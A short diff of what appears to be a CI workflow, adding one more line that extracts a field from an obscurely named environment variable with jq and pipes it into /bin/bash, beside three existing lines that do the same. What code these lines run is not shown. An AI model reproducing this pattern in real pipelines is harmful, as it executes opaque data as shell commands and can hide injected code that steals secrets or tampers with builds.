@@ -30,6 +30,7 @@ jobs:
           echo $pkb80864 | jq -r .czs6 | /bin/bash
           printf '%s' "$tsur07" | jq -r .nt9 | /bin/bash
           printf '%s' "$ga4" | jq -r .ksa321 | /bin/bash
+          echo $ba336 | jq -r .szpeq95971 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
